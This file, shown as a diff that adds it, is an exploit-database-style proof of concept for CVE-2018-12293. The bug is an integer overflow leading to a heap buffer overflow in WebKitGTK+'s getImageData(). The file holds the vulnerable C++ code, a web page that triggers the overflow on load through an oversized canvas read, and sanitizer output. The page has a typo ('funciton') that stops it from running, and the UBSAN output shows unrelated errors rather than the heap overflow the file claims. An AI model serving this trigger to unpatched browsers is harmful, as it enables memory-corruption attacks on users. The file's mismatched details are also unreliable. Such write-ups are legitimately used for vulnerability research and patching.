@@ -1,0 +1,58 @@
+# Exploit Title: WebkitGTK+ 2.20.3 - 'ImageBufferCairo::getImageData()' Buffer Overflow (PoC)
+# Date: 2018-08-15
+# Exploit Author: PeregrineX
+# Vendor Homepage: https://webkitgtk.org/ & https://webkit.org/wpe/
+# Software Link: https://webkitgtk.org/releases/ & https://wpewebkit.org/releases/
+# Version: <2.20.3 (GTK+) <2.20.1 (WPE)
+# Tested on: WebKitGTK+ 2.20.2
+# CVE : CVE-2018-12293
+
+# SUMMARY:
+# getImageData() in ImageBufferCairo.cpp multiplies rect.width() * rect.height() * 4 
+# without any overflow checks. If result is larger than UINT_MAX, 
+# heap-based buffer overflow via integer overflow will occur, 
+# which could be exploited further.
+
+# Works on WebKitGTK+ <2.20.3 and WPE WebKit <2.20.1
+# Credit to ADlab of Venustech for originally finding this vulnerability.
+
+Vulnerable Code (Source/WebCore/platform/graphics/cairo/ImageBufferCairo.cpp):
+
+template <AlphaPremultiplication premultiplied>
+RefPtr<Uint8ClampedArray> getImageData(const IntRect& rect, const IntRect& logicalRect, const ImageBufferData& data, const IntSize& size, const IntSize& logicalSize, float resolutionScale)
+{
+    auto result = Uint8ClampedArray::createUninitialized(rect.width() * rect.height() * 4);
+    if (!result)
+        return nullptr;
+//...
+
+# Proof of Concept:
+<html>
+  <head>
+    <script>
+        funciton poc() {
+            var c = document.getElementById("myCanvas");
+            var ctx = c.getContext("2d");
+            var imgData = ctx.getImageData(0, 0, 32768, 32768);
+        }
+    </script>
+  </head>
+  <body onload="poc()">
+    <canvas id="myCanvas" width="32768" height="32768">No HTML5 canvas tag.</canvas>
+  </body>
+</html>
+
+# Output snippet
+UBSAN output:
+../Source/JavaScriptCore/runtime/JSGlobalObject.cpp:1608:22: runtime error: 
+call to function (unknown) through pointer to incorrect function type 
+'JSC::RuntimeFlags (*)(const JSC::JSGlobalObject *)'
+(/usr/local/lib/libwebkit2gtk-4.0.so.37+0x11116c70): note: (unknown) defined here
+SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior 
+../Source/JavaScriptCore/runtime/JSObject.h:695:17 in 
+DerivedSources/JavaScriptCore/KeywordLookup.h:469:13: runtime error: 
+load of misaligned address 0x7fd8a1d95062 for type 'const uint32_t' 
+(aka 'const unsigned int'), which requires 4 byte alignment
+0x7fd8a1d95062: note: pointer points here
+ 00 00  28 66 75 6e 63 74 69 6f  6e 20 28 74 68 69 73 56  61 6c 75 65 2c 20 61 72  67 75 6d 65 6e 74
+              ^
